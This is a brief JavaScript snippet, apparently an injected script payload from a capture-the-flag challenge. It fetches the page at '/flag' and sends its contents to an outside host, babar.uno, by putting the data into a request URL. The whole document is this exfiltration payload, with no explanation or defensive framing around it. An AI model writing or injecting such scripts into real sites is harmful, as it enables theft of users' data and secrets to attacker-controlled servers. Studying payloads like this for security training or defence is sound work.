(function(){
  fetch('/flag').then(response => response.text()).then(data => fetch('https://babar.uno/'+atob(data));
})();
